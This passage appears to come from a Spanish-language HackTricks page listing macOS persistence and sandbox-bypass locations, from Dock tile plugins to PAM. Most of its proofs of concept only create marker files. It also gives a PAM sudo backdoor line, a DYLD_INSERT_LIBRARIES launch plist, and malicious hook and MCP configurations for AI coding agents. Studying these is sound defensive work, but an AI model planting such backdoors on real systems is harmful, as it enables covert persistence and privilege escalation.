  - El plug-in se carga en un helper **firmado por Apple** que no tiene el entitlement de app-sandbox y tiene **library validation desactivada**. En la investigación citada, este helper no aparecía en la interfaz de Background Task Management; debe comprobarse su visibilidad en la versión de destino.
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, referenciado con la clave **`NSDockTilePlugIn`** en el `Info.plist` de la app; el `Info.plist` propio del plug-in establece **`NSPrincipalClass`**.

#### Descripción y explotación

Cuando una app declara `NSDockTilePlugIn`, el Dock puede cargar el bundle referenciado en el helper XPC **`com.apple.dock.external.extra`** (`...extra.arm64` en Apple Silicon) al iniciar sesión o cuando se añade su icono al Dock; no es necesario que la app se inicie. Para ello, macOS debe detectar y registrar la app, y aceptarla. El helper está **firmado por Apple**, no tiene el entitlement `com.apple.security.app-sandbox` y tiene `com.apple.security.cs.disable-library-validation`. Al cargar, se invoca el método **`setDockTile:`** de la clase principal; desde ahí puede suscribirse a notificaciones distribuidas (p. ej., `com.apple.screenIsLocked`) para recibir eventos posteriores.<sup>[[38]](#references)</sup>

En macOS 26.5.2, una inspección de solo lectura con `codesign` confirmó la firma y los entitlements de Apple del helper, y varias apps instaladas declaraban `NSDockTilePlugIn`. No se instaló ni cargó ningún plug-in nuevo en ese Mac, por lo que la ejecución de un bundle recién escrito en esa versión sigue sin probarse.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - La extensión del widget se ejecuta en su **propio proceso**, y añadir uno **no** muestra una alerta de Background Task Management
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
  - El plist de configuración se encuentra dentro de un contenedor protegido por TCC, por lo que editarlo desde fuera requiere Full Disk Access o un bypass de TCC

#### Ubicación

- Bundle de la extensión del widget: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Widgets activos/registrados: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (claves `widgets.instances` y `widgets.widgets`)

#### Descripción y explotación

Una extensión de WidgetKit incluida en una app se ejecuta en **su propio proceso**, administrado por Notification Center. Registrar una instancia en `widgets.instances` (un blob `CHSWidget` codificado en base64 con `NSKeyedArchiver` y datos `INIntent` incrustados) y reiniciar NotificationCenter hace que el widget se cargue y ejecute su código `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Reglas de Mail.app (Ejecutar AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero Mail.app debe estar configurado con una cuenta y en ejecución; el trigger es un correo entrante
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Editar las reglas/scripts desde fuera de Mail puede requerir que Mail esté cerrado y Full Disk Access en macOS moderno

#### Ubicación

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (reglas locales; `V10` en Sonoma/Sequoia, `V11`+ en versiones posteriores)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (reglas sincronizadas con iCloud, tienen prioridad)
- Activación de reglas: **`RulesActiveState.plist`**; payload de AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Descripción y explotación

Una **regla** de Apple Mail puede tener una acción *"Run AppleScript"*. Al añadir una regla que coincida con una **línea de asunto** preparada y ejecute un script del atacante, el adversario obtiene ejecución de código **remota y sigilosa** en el contexto de Mail cada vez que llega el correo mágico; es un vector que evade muchos scanners de persistencia porque no se crea ningún LaunchAgent/Login Item.<sup>[[42]](#references)</sup> Configurar la regla para que también **elimine** el correo desencadenante oculta las pruebas. Los defensores pueden buscarla directamente:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Perfiles de configuración (.mobileconfig)

Informe: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Útil para bypass del sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - Las versiones modernas de macOS requieren **aprobación manual del usuario** en Ajustes del Sistema → *Gestión de dispositivos* (la instalación silenciosa con `profiles install` ya no está disponible fuera de MDM)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Los perfiles instalados se encuentran en **`/Library/Managed Preferences/`** y **`/var/db/ConfigurationProfiles/`**; un perfil es un plist XML con un array `PayloadContent`.

#### Descripción y explotación

Un `.mobileconfig` no es un primitivo de ejecución de código directo, pero puede persistir configuraciones como una **CA raíz de confianza** (`com.apple.security.root`), un **proxy global o PAC** (`com.apple.proxy.*`), **preferencias administradas** (`com.apple.ManagedClient.preferences`) o restricciones. En macOS 10.15 y versiones posteriores, la definición de [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel) de Apple indica que, si se establece en `true` en un perfil **instalado manualmente** sin un payload de contraseña de eliminación, se requiere **autenticación de administrador** para eliminarlo; esto no hace que el perfil sea absolutamente imposible de eliminar. Los perfiles instalados por MDM tienen reglas de gestión y eliminación independientes.<sup>[[44]](#references)</sup>

> [!WARNING]
> Un perfil de configuración básico **no tiene ningún tipo de payload que instale un `LaunchDaemon`/`LaunchAgent` arbitrario**. Para instalar un daemon de esta forma se requiere la **inscripción completa en MDM** además de un agente/script de gestión; no trates `.mobileconfig` como un mecanismo de distribución de launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistencia de DYLD_INSERT_LIBRARIES

- Útil para eludir sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **elimina** `DYLD_*` en binarios de SIP/plataforma, apps con hardened runtime y objetivos setuid, por lo que solo inyecta en procesos desprotegidos y **no** elude SIP/el hardened runtime
- Elusión de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Forma fiable: el diccionario **`EnvironmentVariables`** dentro de un plist malicioso de `LaunchAgent`/`LaunchDaemon` (se ejecuta al iniciar sesión/arrancar el sistema)
- Obsoletos/históricos (solo para informar): **`~/.MacOSX/environment.plist`** (eliminado en 10.8) y **`/etc/launchd.conf`** (eliminado en 10.10)

#### Descripción y explotación

Si un atacante consigue incluir `DYLD_INSERT_LIBRARIES` en el entorno de un proceso víctima, dyld carga la dylib del atacante (se ejecuta su constructor) en ese proceso. La variante persistente incluye la variable en un LaunchAgent, de modo que cada inicio del job vuelve a inyectarla. Ten en cuenta que `launchctl setenv DYLD_*` se filtra en las versiones modernas de macOS, así que inclúyela en el plist en su lugar.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Para conocer todos los detalles de la inyección/secuestro de dylib, consulta:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLIs de agentes de programación con IA (hooks, servidores MCP, archivos de reglas)

Informes: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Puerta trasera en archivo de reglas (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Requiere que el desarrollador use el agente correspondiente. Los comandos de inicio se ejecutan con los privilegios de ese usuario cuando el agente acepta su configuración; la confianza en el espacio de trabajo y la aprobación de MCP varían según el producto y el modo de sesión.
- Elusión de TCC: [🔴](https://emojipedia.org/large-red-circle) (se ejecuta como el usuario; hereda los permisos que ya tenga el terminal/agente)

#### Ubicación

Los archivos explícitos de configuración de hooks y MCP pueden hacer que **se ejecuten comandos de shell o procesos secundarios cuando el desarrollador usa la herramienta**, ya sea desde un archivo global por usuario (persistencia) o desde un archivo incluido en un repositorio (cadena de suministro). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` y las reglas del editor son **instrucciones para un agente**, no garantizan la ejecución de comandos de shell al leerse; su efecto depende del comportamiento del agente y de los permisos de las herramientas. Comprueba las reglas actuales de confianza y aprobación de cada producto.

- **Claude Code**
  - `~/.claude/settings.json`, el archivo de proyecto `.claude/settings.json`, `.claude/settings.local.json` y el archivo **`/Library/Application Support/ClaudeCode/managed-settings.json`**, solo para root (la configuración administrada/por MDM **no puede ser sobrescrita** por el usuario → persistencia sólida)
  - Objeto `hooks`: los eventos `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact`; cada uno ejecuta un comando de shell
  - `statusLine.command`: un comando de shell que se ejecuta para mostrar la línea de estado (en cada sesión)
  - Servidores MCP en `~/.claude.json` / proyecto `.mcp.json`: `command`+`args` se ejecutan como procesos secundarios
  - `CLAUDE.md` / `~/.claude/CLAUDE.md`: instrucciones que pueden intentar una inyección de prompt, sujetas al comportamiento del agente y a los permisos de las herramientas
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` se ejecutan como procesos secundarios); instrucciones de proyecto en `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, servidores MCP); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … ejecutan comandos); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Descripción y explotación

Si un actor puede modificar la configuración global de usuario de la cuenta, sus comandos de hook o MCP pueden ejecutarse en futuras sesiones bajo esa cuenta. La configuración controlada por un repositorio es un caso aparte: [la documentación de seguridad actual de Claude Code](https://code.claude.com/docs/en/security) describe un diálogo interactivo de confianza en el espacio de trabajo y una solicitud de aprobación aparte para los servidores `.mcp.json` del proyecto. [Su matriz de permisos](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) indica que los hooks pueden ejecutarse después de que se haya otorgado confianza a una carpeta principal, y que las sesiones `claude -p`/SDK no muestran la solicitud interactiva de confianza; en esos modos no interactivos, los servidores MCP del proyecto se conectan sin solicitar aprobación. La elusión de hooks de proyecto antes de otorgar confianza, reportada como CVE-2025-59536, fue [corregida en 2025](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); no la consideres un comportamiento predeterminado actual. Los vectores de distribución pueden incluir un repositorio comprometido o un instalador malicioso. La inyección de prompt mediante archivos de reglas es menos determinista que un hook explícito y sigue dependiendo de la aprobación de las herramientas.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Ejemplo de configuración global de usuario de Claude Code; úsalo solo en una cuenta desechable al hacer pruebas:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Ejemplo de configuración global de Codex MCP para el usuario:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Ejemplo de configuración de hook de Cursor; comprueba el esquema de la versión instalada antes de usarla:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Extensiones del navegador (Chromium: Chrome / Brave / Edge)

Writeup: [Extensiones externas de Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Abuso de ExtensionInstallForcelist en macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Útil para evitar el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Requiere un navegador compatible y una extensión instalada y habilitada. Las extensiones externas en macOS requieren confirmación del usuario; la instalación forzada administrada requiere una política empresarial aplicable.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Esto es distinto de los **native messaging hosts** (consulta la sección *Chrome native messaging hosts* anterior). Aquí, la persistencia es la **extensión instalada automáticamente**.

#### Ubicación

- **JSON de extensiones externas** (se detecta al iniciar el navegador y, después, se muestra una solicitud de habilitación en macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (por usuario) o `/Library/Application Support/Google/Chrome/External Extensions/` (todos los usuarios)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Instalación forzada mediante políticas empresariales** a través de preferencias administradas o un perfil de configuración:
  - Clave `ExtensionInstallForcelist` de `com.google.Chrome` (`com.brave.Browser` para Brave, `com.microsoft.Edge` para Edge), leída desde `/Library/Managed Preferences/` o desde un `.mobileconfig` instalado

#### Descripción y explotación

Son dos métodos de instalación distintos. La [documentación de instalación externa de Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) indica que los usuarios de **Windows y macOS deben confirmar y habilitar** las extensiones ofrecidas mediante un archivo *External Extensions*; estas no se ejecutan simplemente porque se haya escrito ese archivo JSON. Para instalar para todos los usuarios en macOS, Chrome también exige que el archivo de extensiones externas esté protegido contra modificaciones de usuarios sin privilegios. Una política administrada `ExtensionInstallForcelist` o `ExtensionSettings` puede instalar y fijar una extensión sin intervención del usuario; la [guía de políticas de Google para Mac](https://support.google.com/chrome/a/answer/7517624) describe la configuración administrada e indica que el usuario no puede quitar las extensiones instaladas de manera forzada. Esta es una vía de implementación mediante políticas, no un atajo de `defaults write` por usuario.<sup>[[49]](#references)</sup>

> [!WARNING]
> En macOS, un manifiesto JSON de *External Extensions* debe apuntar a una URL de actualización de **Chrome Web Store**, no a un CRX local. La implementación mediante políticas administradas tiene sus propios requisitos empresariales y puede permitir una URL de actualización autohospedada administrada. Para una extensión local sin empaquetar en un perfil de prueba, el parámetro `--load-extension=/path` del modo de desarrollador de Chrome es un mecanismo distinto y no hace que un archivo JSON de External Extensions se ejecute automáticamente. No consideres que escribir en `Secure Preferences` equivale a ninguno de los métodos de registro documentados.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Inicia Chrome en esa cuenta desechable y observa el aviso de habilitación; el comportamiento propio de la extensión es el PoC de ejecución una vez que el usuario lo acepta. Después de la prueba, elimina el manifiesto y deshabilita o desinstala la extensión en ese perfil. Esta ruta **no** se probó en el perfil activo de Chrome del Mac de investigación. La ruta de políticas administradas tampoco se implementó allí.

Force-install y External Extensions hacen referencia a IDs de extensiones de **Chrome Web Store**; para el truco de nivel inferior que inyecta silenciosamente una extensión local editando las `Secure Preferences` del perfil, firmadas con HMAC, y otros abusos de procesos de Chromium, consulta:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Esquemas URL y gestores de tipos de archivo (LaunchServices)

Análisis: [Explotación remota de Mac mediante esquemas URL personalizados (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - El desencadenante es que la víctima haga clic en un enlace (p. ej., en Chrome/Brave/Safari) o abra un archivo del tipo registrado
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Un `Info.plist` del paquete de una app que declare **`CFBundleURLTypes`/`CFBundleURLSchemes`** (esquema URL personalizado) o **`CFBundleDocumentTypes`** (extensión de archivo/UTI)
- Los valores predeterminados efectivos por usuario pueden aparecer en **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (arreglo `LSHandlers`). La API compatible de Apple para elegir un valor predeterminado para un esquema URL es `LSSetDefaultHandlerForURLScheme`; escribir directamente en ese plist no es un método documentado de registro ni de actualización de caché.

#### Descripción y explotación

Launch Services obtiene las declaraciones de esquemas URL y documentos del `Info.plist` de una app registrada. La [guía de registro de Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) indica que el registro puede producirse cuando Finder detecta la app, durante el arranque o el inicio de sesión, o mediante una API de registro explícita; escribir una app en una ubicación cualquiera no garantiza que esto se desencadene de inmediato. Una vez registrada, abrir una URL o un documento coincidente puede iniciar la app gestora seleccionada, sujeto a la elección del usuario del gestor predeterminado y a las comprobaciones normales de inicio de macOS. La API compatible `LSSetDefaultHandlerForURLScheme` cambia el gestor URL preferido por el usuario; no hace que una app recién copiada se ejecute automáticamente.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

No se registró ninguna app ni se cambió ninguna preferencia de handler en el Mac de investigación con macOS 26.5.2. Para probar un handler real, usa una cuenta de usuario desechable, registra una app que solo muestre un marcador con un scheme único, invoca su URL y luego elimina la app y su registro.

Para enumerar y abusar en profundidad de los handlers de extensiones de archivo y URL schemes, consulta:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Archivos de inicio de Python (`.pth` / `usercustomize` / `sitecustomize`)

Documentación: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Se ejecuta cuando se inicia el intérprete de Python correspondiente con ese directorio `site` habilitado; el trigger no es universal en todos los entornos virtuales, builds de Python ni flags de inicio
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Se ejecuta con los privilegios/TCC del proceso que haya iniciado el intérprete

#### Ubicación

- **`$(python3 -m site --user-site)/*.pth`** (builds del framework de macOS: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - No se requiere root (escribible por el usuario)
  - **Trigger**: inicio de ese build de Python con su sitio de usuario habilitado; el módulo `site` procesa los archivos `.pth` de los directorios `site` activos
- **`<user-site>/usercustomize.py`**
  - No se requiere root
  - **Trigger**: inicio con el sitio de usuario habilitado (importado automáticamente por `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (p. ej., `/opt/homebrew/lib/python3.13/site-packages/` o rutas del sistema)
  - Puede requerirse root/admin, según la ubicación del intérprete
  - **Trigger**: inicio de un intérprete que incluya ese directorio `site`

#### Descripción y explotación

Al iniciarse, Python normalmente importa `site` y busca archivos `.pth` en sus directorios `site-packages` activos. Además de agregar rutas, una línea `.pth` que empiece con `import ` ejecuta código Python aunque el módulo indicado no se use de ninguna otra forma. Python también intenta importar `sitecustomize` y, **cuando el sitio de usuario está habilitado**, `usercustomize`.<sup>[[56]](#references)</sup> El trigger ocurre cuando posteriormente se inicia un intérprete que detecta el directorio modificado. `-S` deshabilita el procesamiento de `site`; `-s`, `-I` o `PYTHONNOUSERSITE` deshabilitan las variantes del **sitio de usuario**. Por lo general, `-I` no deshabilita un `sitecustomize` global. Los entornos virtuales también pueden excluir el sitio de usuario. Consulta `python3 -m site` para el intérprete específico.

La siguiente PoC se ejecutó en macOS 26.5.2. Para esta prueba, `PYTHONUSERBASE` mueve el sitio de usuario a un directorio temporal; no se modifica ningún sitio de usuario real:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Aparecieron ambos marcadores. Repetir con `-s`, `-I` o `-S` impidió ambos marcadores de **user-site** en esta prueba. No se probó `sitecustomize` en un directorio global de site.

## Root Sandbox Bypass

> [!TIP]
> Aquí puedes encontrar ubicaciones de inicio útiles para **sandbox bypass** que permiten simplemente ejecutar algo **escribiéndolo en un archivo**, siendo **root** y/o requiriendo otras **condiciones extrañas**.

### Periodic

> [!CAUTION]
> **Mecanismo histórico:** En la máquina de prueba con macOS 26.5.2, no existen `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` ni los launch daemons `com.apple.periodic-*`. No des por sentado que crear `/etc/periodic` en un sistema actual programará su contenido. Comprueba que tanto el comando como un scheduler habilitado existan en la versión de destino antes de usar el ejemplo siguiente.

Artículo: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Pero necesitas ser root
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Se requiere root
  - **Activación**: Cuando llegue el momento
- `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`
  - Se requiere root
  - **Activación**: Cuando llegue el momento

#### Descripción y explotación

En versiones anteriores, los scripts de periodic (**`/etc/periodic`**) eran programados por **launch daemons** en `/System/Library/LaunchDaemons/com.apple.periodic*`. Desde macOS Big Sur 11.5, el ejecutor de periodic ejecuta los scripts de los directorios periodic como el **propietario de cada archivo**, cerrando una antigua vía de escalada de privilegios.<sup>[[27]](#references)</sup> Los comandos y listados de directorios siguientes son resultados históricos, no resultados de una prueba en macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Hay otros scripts periódicos que se ejecutarán, indicados en **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

En sistemas antiguos con `periodic` y sus launch daemons instalados y habilitados, `/etc/daily.local`, `/etc/weekly.local` y `/etc/monthly.local` eran vías de ejecución adicionales. Una comprobación inocua de solo lectura es:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> La regla basada en el propietario se aplicaba a los scripts ubicados directamente en los directorios periódicos. El wrapper histórico `999.local` solía cargar `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local` sin esa misma comprobación de propiedad; cuando el scheduler se ejecutaba como root, estos archivos locales se ejecutaban como root. Esta distinción y el cambio de Big Sur 11.5 están documentados en la [investigación original](https://theevilbit.github.io/beyond/beyond_0019/). No se debe asumir que ninguna de estas rutas está activa si `periodic` no está presente.

### PAM

Artículo: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Artículo: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Útil para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Pero necesitas ser root
- Evasión de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Siempre se requiere root

#### Descripción y explotación

Como PAM está más enfocado en la **persistencia** y el malware que en la ejecución sencilla dentro de macOS, este blog no dará una explicación detallada. **Lee los artículos para comprender mejor esta técnica**.<sup>[[28]](#references)</sup>

Comprueba los módulos PAM con:

```bash
ls -l /etc/pam.d
```

Una técnica de persistencia/escalada de privilegios que abusa de PAM es tan sencilla como modificar el módulo /etc/pam.d/sudo y añadir al principio la línea:

```bash
auth       sufficient     pam_permit.so
```

Así que **se verá** algo así:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Y por lo tanto, cualquier intento de usar **`sudo` funcionará**.

> [!CAUTION]
> Ten en cuenta que este directorio está protegido por TCC, así que es muy probable que el usuario reciba una solicitud de acceso.

Otro buen ejemplo es `su`, donde puedes ver que también es posible pasar parámetros a los módulos PAM (y también podrías instalar una backdoor en este archivo):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Plugins de autorización

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Útil para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Pero necesitas ser root y crear configuraciones adicionales
- Bypass de TCC: ???

#### Ubicación

- `/Library/Security/SecurityAgentPlugins/`
  - Se requieren privilegios de root
  - También es necesario configurar la base de datos de autorización para que use el plugin

#### Descripción y explotación

Puedes crear un plugin de autorización que se ejecutará cuando un usuario inicie sesión para mantener la persistencia. Para obtener más información sobre cómo crear uno de estos plugins, consulta los writeups anteriores (y ten cuidado: uno mal escrito puede bloquearte el acceso y tendrás que limpiar tu Mac desde el modo de recuperación).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
